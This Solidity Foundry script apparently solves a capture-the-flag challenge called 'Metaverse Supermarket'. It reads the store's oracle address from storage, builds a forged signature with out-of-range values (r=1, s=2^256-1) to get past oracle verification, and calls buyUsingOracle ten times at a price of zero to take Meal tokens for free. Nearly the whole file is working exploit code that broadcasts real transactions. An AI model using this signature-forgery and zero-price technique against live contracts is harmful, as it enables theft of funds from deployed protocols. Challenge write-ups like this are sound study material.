// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeMetaverseSupermarket.sol";

contract ChallengeMetaverseSupermarketScript is Script {
    address constant STORE_ADDR = 0x6e45551151499c0F58550248089C8327185f7Ca3;
    bytes32 constant HASH = bytes32(uint(1));
    address constant PLAYER = 0xeC09A77427caC13A598C9eD9420AA975bfE17CE9;

    InflaStore store;
    Signature sig;

    function setUp() public {
        store = InflaStore(STORE_ADDR);

        uint8 v = 27;
        bytes32 r = bytes32(uint(1));
        bytes32 s = bytes32(uint(2**256 - 1));
        sig = Signature(v, r, s);
    }

    function toAddress(bytes32 val) public pure returns (address) {
        return address(uint160(uint256(val)));
    }

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        Meal meal = store.meal();
        Infla infla = store.infla();

        uint initBalance = meal.balanceOf(PLAYER);
        console.log("Initial Meal Balance: %d", initBalance);
        console.log("Initial Infla Balance: %d", infla.balanceOf(PLAYER));

        bytes32 val = vm.load(STORE_ADDR, bytes32(uint256(1)));
        
        // Check oracle address
        console.logAddress(toAddress(val));

        OraclePrice memory op = OraclePrice({
            blockNumber: block.number,
            price: 0
        });

        for (uint idx; idx < 10; ++idx) {
            store.buyUsingOracle(op, sig);
        }

        uint finalBalance = meal.balanceOf(PLAYER);
        console.log("Final Meal Balance: %d", finalBalance);

        vm.stopBroadcast();
    }
}
